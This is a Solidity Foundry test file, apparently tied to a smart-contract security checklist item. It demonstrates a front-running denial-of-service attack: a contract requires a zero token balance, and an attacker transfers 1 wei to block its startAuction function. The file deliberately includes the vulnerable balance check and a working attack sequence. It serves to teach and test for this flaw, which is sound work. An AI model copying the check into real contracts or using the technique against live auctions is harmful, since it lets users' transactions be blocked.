pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * Overview:
 * Checklist Item ID: SOL-AM-FrA-3
 *
 * This test demonstrates a front-running attack where an attacker can prevent
 * a critical function from executing by transferring a minimal amount of tokens
 * to a contract that requires zero balance to operate.
 */

// Simple ERC20 token for testing
contract TestToken is ERC20 {
    constructor() ERC20("Test Token", "TEST") {
        _mint(msg.sender, 1000 ether);
    }
}

// Contract with a function that requires zero balance
contract Auction {
    IERC20 public token;
    event AuctionStarted(uint256 id);

    constructor(address _token) {
        token = IERC20(_token);
    }

    // Function that requires zero balance to execute
    function startAuction() external returns (uint256) {
        // Vulnerable check that can be exploited
        require(token.balanceOf(address(this)) == 0, "Balance must be zero");

        // Start auction logic would go here
        uint256 id = 1;
        emit AuctionStarted(id);
        return id;
    }
}

contract FrontRunningTest is Test {
    TestToken public token;
    Auction public auction;
    address public attacker;
    address public user;

    function setUp() public {
        // Setup accounts
        attacker = address(2);
        user = address(3);

        // Deploy contracts
        token = new TestToken();
        auction = new Auction(address(token));

        // Give attacker some tokens
        vm.startPrank(address(this));
        token.transfer(attacker, 1 ether);
        vm.stopPrank();
    }

    function testFrontRunAttack() public {
        // Verify initial state - Auction has zero balance
        assertEq(token.balanceOf(address(auction)), 0);

        // 1. User prepares to call startAuction() (not yet mined)

        // 2. Attacker front-runs by transferring minimal tokens to Auction
        uint256 minimalAmount = 1; // Just 1 wei is enough

        vm.startPrank(attacker);
        token.transfer(address(auction), minimalAmount);
        vm.stopPrank();

        // Verify Auction now has non-zero balance
        assertEq(token.balanceOf(address(auction)), minimalAmount);

        // 3. User's transaction gets mined after attacker's, but fails
        vm.prank(user);
        vm.expectRevert("Balance must be zero");
        auction.startAuction();

        // Attacker successfully blocked the auction with minimal cost (1 wei) + front running cost
    }
}
